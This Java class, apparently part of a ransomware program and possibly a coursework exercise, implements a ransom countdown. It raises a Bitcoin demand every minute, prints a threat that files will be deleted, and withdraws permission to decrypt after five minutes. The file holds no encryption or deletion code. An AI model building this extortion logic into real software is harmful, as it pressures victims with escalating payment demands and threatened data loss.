package S01;

import java.util.concurrent.TimeUnit;

public class Timer implements Runnable{

    private float price;
    private int SpentTime = 0;
    private boolean allowToDecrypt = true;
    private boolean isActive = false;
    private final int MaxTimeInMin = 5;
    private final float plusValue = 0.01f;


    public Timer(float amount) {
        this.price = amount;
    }

    @Override
    public void run() {
        isActive = true;

        while(SpentTime < MaxTimeInMin){
            if (Thread.interrupted()){
                isActive = false;
                return;
            }

            if (SpentTime == 0){
                try{
                    TimeUnit.MINUTES.sleep(1);
                }catch (InterruptedException e){
                    e.printStackTrace();
                    isActive = false;
                    return;
                }
            }else{
                try{
                    newAmount(plusValue);
                    System.out.println("Amount to pay increased by 0.01 BTC to " + price + " BTC");
                    if(SpentTime == 4){
                        System.out.println("Pay " + price + " BTC immediately or your files will be deleted forever");
                    }
                    TimeUnit.MINUTES.sleep(1);

                }catch (InterruptedException e){
                    e.printStackTrace();
                    isActive = false;
                    return;
                }
            }
            SpentTime++;
        }

        if(!Thread.interrupted()){
            allowToDecrypt = false;
            isActive = false;
        }else{
            System.out.println("5 Minutes are finished: " + SpentTime);
        }
    }

    public boolean isAllowToDecrypt() {
        return allowToDecrypt;
    }

    public float newAmount(float amount){
        return this.price = price + amount;
    }

    public float getPrice() {
        return price;
    }
}
